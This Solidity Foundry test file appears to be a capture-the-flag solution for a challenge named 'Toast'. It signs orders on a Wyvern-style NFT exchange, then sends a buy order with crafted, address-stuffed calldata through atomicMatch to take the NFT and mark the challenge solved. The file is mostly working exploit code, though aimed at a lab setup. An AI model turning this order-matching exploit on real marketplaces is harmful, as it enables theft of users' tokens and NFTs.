// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "src/Setup.sol";

contract ToastT is Test {
    Setup setup;
    Exchange exchange;
    WETH weth;
    Toast toast;
    ToastNFT toastNFT;

    address user;
    address owner;

    uint256 userPK;
    uint256 ownerPK;
    uint256 scamPK;

    function setUp() external {
        (owner, ownerPK) = makeAddrAndKey('owner');
        (user, userPK) = makeAddrAndKey('user');

        string memory mnemonic = "test test test test test test test test test test test junk";
        scamPK = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 19); // 0xdf57089febbacf7ba0bc227dafbffa9fc08a93fdc68e1e42411a14efcf23656e

        vm.deal(owner, 402 ether);
        vm.deal(user, 1 ether);

        // setup = Setup(<ADDRESS>);
        vm.broadcast(owner);
        setup = new Setup{value: 400 ether}();

        weth = setup.weth();
        exchange = setup.exchange();
        toast = setup.toast();
        toastNFT = setup.toastNFT();

        vm.startBroadcast(ownerPK);
        {
            uint64 nonce = vm.getNonce(vm.addr(ownerPK));

            toastNFT.setApprovalForAll(address(toast), true);

            Order memory sell = Order({
                exchange: address(exchange),
                maker: vm.addr(ownerPK),
                salt: nonce,
                taker: address(0),
                side: SaleKindInterface.Side.Sell,
                saleKind: SaleKindInterface.SaleKind.FixedPrice,
                target: address(toast),
                howToCall: AuthenticatedProxy.HowToCall(0),
                calldata_: '',
                staticTarget: address(0),
                paymentToken: address(weth),
                basePrice: 400e18,
                expirationTime: 0,
                feeMethod: FeeMethod(0),
                sig: ''
            });

            bytes32 hash = hashOrder(sell);
            
            bytes32 DOMAIN_TYPEHASH = 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f;
            bytes32 domainHash = keccak256(abi.encode(
                DOMAIN_TYPEHASH,
                keccak256("Toast"),
                keccak256("0"),
                block.chainid,
                address(exchange)
            ));

            bytes32 digest = keccak256(
                abi.encodePacked(
                    hex'1901',
                    domainHash,
                    hash
                )
            );

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPK, digest);
            sell.sig = abi.encodePacked(r, s, v);

            setup.setSig(sell.sig);
        }
        vm.stopBroadcast();
    }

    function test() external {
        vm.startBroadcast(scamPK);
        {
            weth.transfer(vm.addr(userPK), weth.balanceOf(vm.addr(scamPK)));
            console2.log(weth.balanceOf(vm.addr(userPK)));
        }
        vm.stopBroadcast();

        vm.startBroadcast(userPK);
        {
            weth.approve(address(toast), type(uint256).max);

            Order memory sell = Order({
                exchange: address(exchange),
                maker: owner,
                salt: 0x1,
                taker: address(0),
                side: SaleKindInterface.Side.Sell,
                saleKind: SaleKindInterface.SaleKind.FixedPrice,
                target: address(toast),
                howToCall: AuthenticatedProxy.HowToCall(0),
                calldata_: '',
                staticTarget: address(0),
                paymentToken: address(weth),
                basePrice: 400e18,
                expirationTime: 0,
                feeMethod: FeeMethod(0),
                sig: setup.sellSig()
            });

            address[] memory addr = new address[](10);
            addr[0] = vm.addr(userPK);
            addr[1] = address(vm.addr(userPK));
            addr[2] = address(vm.addr(userPK));
            addr[3] = address(vm.addr(userPK));
            addr[4] = address(vm.addr(userPK));
            addr[5] = address(vm.addr(userPK));
            addr[6] = address(vm.addr(userPK));
            addr[7] = address(vm.addr(userPK));
            addr[8] = address(vm.addr(userPK));
            addr[9] = address(vm.addr(userPK));

            Order memory buy = Order({
                exchange: address(exchange),
                maker: vm.addr(userPK),
                salt: 100,
                taker: address(0),
                side: SaleKindInterface.Side.Buy,
                saleKind: SaleKindInterface.SaleKind.FixedPrice,
                target: address(toast),
                howToCall: AuthenticatedProxy.HowToCall(0),
                calldata_: abi.encode(addr, abi.encodePacked(
                    hex'0000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'000000000000000000000000',
                    vm.addr(userPK),
                    hex'00000000'
                )),
                staticTarget: address(0),
                paymentToken: address(weth),
                basePrice: 400e18,
                expirationTime: 0,
                feeMethod: FeeMethod(0),
                sig: ''
            });

            bytes32 hash = hashOrder(buy);

            bytes32 DOMAIN_TYPEHASH = 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f;
            bytes32 domainHash = keccak256(abi.encode(
                DOMAIN_TYPEHASH,
                keccak256("Toast"),
                keccak256("0"),
                block.chainid,
                address(exchange)
            ));

            bytes32 digest = keccak256(
                abi.encodePacked(
                    hex'1901',
                    domainHash,
                    hash
                )
            );

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPK, digest);
            buy.sig = abi.encodePacked(r, s, v);

            exchange.atomicMatch(buy, sell);

            console2.log(toastNFT.balanceOf(address(0xd578389f9C7dE8C4466d8a33C0cf7F70b64Cf35E), 1337));

            console2.log(setup.isSolved());
            setup.solve();
            console2.log(setup.isSolved());
        }
        vm.stopBroadcast();
    }

    function hashOrder(Order memory order) internal pure returns (bytes32 hash) {
        bytes32 ORDER_TYPEHASH = 0xca2b31eece9789f8640037795ba5e3065ba8d82ef095c0f8c0f4310a0d1f96ea;
        bytes memory part1;
        bytes memory part2;
        {
            part1 = abi.encode(
                ORDER_TYPEHASH,
                order.exchange,
                order.maker,
                order.salt,
                order.taker,
                order.side,
                order.saleKind
            );
        }
        {
            part2 = abi.encode(
                order.target,
                order.howToCall,
                keccak256(order.calldata_),
                order.staticTarget,
                order.paymentToken,
                order.basePrice,
                order.expirationTime,
                order.feeMethod
            );
        }
        return keccak256(abi.encodePacked(part1, part2));
    }
}
